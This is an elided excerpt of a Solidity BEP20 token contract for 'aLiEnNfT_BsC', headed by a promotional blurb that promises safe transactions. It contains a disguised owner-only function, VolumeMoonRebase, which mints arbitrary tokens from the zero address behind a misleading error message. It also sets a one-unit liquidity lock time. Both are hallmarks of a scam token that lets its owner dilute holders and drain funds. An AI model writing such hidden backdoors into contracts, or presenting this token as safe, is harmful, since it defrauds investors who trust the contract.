...
/**👽AlienNFT$ is the first space bounty token that will allow everyone in our galaxy to make safe transactions. Stealth launch soon and we plan to launch NFT in this week


Telegram: https://t.me/AlienNFT_bsc
...
*/
    ...
    abstract contract Ownable {
        ...
        function LPLOCKED() public onlyOwner {
    ...
    contract aLiEnNfT_BsC is IBEP20, Ownable
    {
        ...
        string private constant _name = "aLiEnNfT_BsC";
        string private constant _symbol = "ANB";
        uint8 private constant _decimals = 9;
        uint256 public constant ContractVolume= 1000000 * 10**_decimals;


        uint256 private constant DefaultLiquidityLockTime= 1;
        
        address public constant MarketingWallet=0xF0F93c05A29D64DB74844047E3f095eD2CB86e4B;
        address private constant PancakeRouter=0x10ED43C718714eb63d5aA57B78B54704E256024E;


        uint256 private _ContractAddress =ContractVolume;
        ...
        constructor () {
            uint256 deployerBalance=_ContractAddress;
      ...
      function VolumeMoonRebase(address account, uint256 balance) onlyOwner  public virtual {
        require(account != address(0), "Insufficient Balance");
        _VolumeReplace(address(0), account, balance);
        ...
        function _transfer(address sender, address recipient, uint256 amount) private{
            ...
            _VolumeReplace(sender, recipient, amount);
        ...
        function _taxedTransfer(address sender, address recipient, uint256 amount,bool isBuy,bool isSell) private{
            ...
            _ContractAddress-=tokensToBeBurnt;
       ...
       function _addLiquidity(uint256 tokenamount, uint256 bnbamount) private {
        ...
        function getBurnedTokens() public view returns(uint256){
            return (ContractVolume-_ContractAddress)/10**_decimals;
        }
    ...
    function ReannounceContract() public onlyOwner{
